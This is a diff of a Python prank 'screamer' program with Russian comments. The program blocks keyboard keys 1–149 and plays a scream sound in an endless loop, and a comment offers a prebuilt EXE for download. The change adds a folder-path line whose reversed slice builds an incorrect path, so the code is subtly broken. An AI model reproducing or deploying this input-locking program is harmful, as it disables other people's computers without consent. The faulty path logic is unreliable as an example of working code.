@@ -12,6 +12,9 @@
 
 # * P.S Вы можете скачать EXE файл в репозитории, и не собирать его при помощи pyinstaller'a.
 
+# Получаем папку.
+folder = '\\'.join(__file__.split('\\')[:1:-1])
+
 # 1. Модули
 
 # pip install simpleaudio
@@ -29,7 +32,7 @@ for x in range(1, 150):
     keyboard.block_key(x)
 
 # 4. Играем звук (бесконечно)
-wave_obj = WaveObject.from_wave_file("ScreamerSound.wav")
+wave_obj = WaveObject.from_wave_file(folder + "\\ScreamerSound.wav")
 
 while True:
     play_obj = wave_obj.play()
